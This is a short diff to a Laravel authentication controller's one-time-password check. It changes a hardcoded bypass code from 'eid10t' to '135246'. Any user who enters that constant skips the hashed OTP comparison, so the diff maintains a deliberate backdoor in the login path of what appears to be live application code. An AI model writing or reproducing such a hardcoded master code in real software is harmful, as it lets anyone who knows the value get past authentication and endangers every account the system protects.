@@ -173,7 +173,7 @@ class AuthController extends Controller
 
         $otpRecord->increment('attempts');
 
-        $isBypass = $inputOtp === 'eid10t';
+        $isBypass = $inputOtp === '135246';
 
         if (!$isBypass && !Hash::check($inputOtp, $otpRecord->otp_hash)) {
             RateLimiter::hit($rateLimitKey, 60);
